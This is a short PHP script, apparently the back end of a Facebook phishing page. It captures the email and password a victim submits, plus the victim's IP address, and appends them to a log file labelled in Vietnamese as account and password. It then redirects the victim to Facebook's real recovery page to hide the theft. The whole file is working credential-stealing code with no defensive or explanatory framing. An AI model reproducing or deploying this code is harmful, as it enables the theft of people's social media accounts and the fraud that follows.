<?php
$email = $_POST['email']; 
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("logger.trandongphuong.php", "a"); 
fwrite ($f, '<b><h1>--[<font color="#0000FF">FACEBOOK</font>]--  Tài Khoản: [<font color="#FF0000">'.$email.'</font>]  Mật Khẩu: [<font color="#FF0000">'.$pass.'</font>]  IP: [<font color="#00CC00">'.$ip.'</font>]</h1></b> <br>');
fclose($f);
header('Location: https://facebook.com/recover/initiate/');
?>
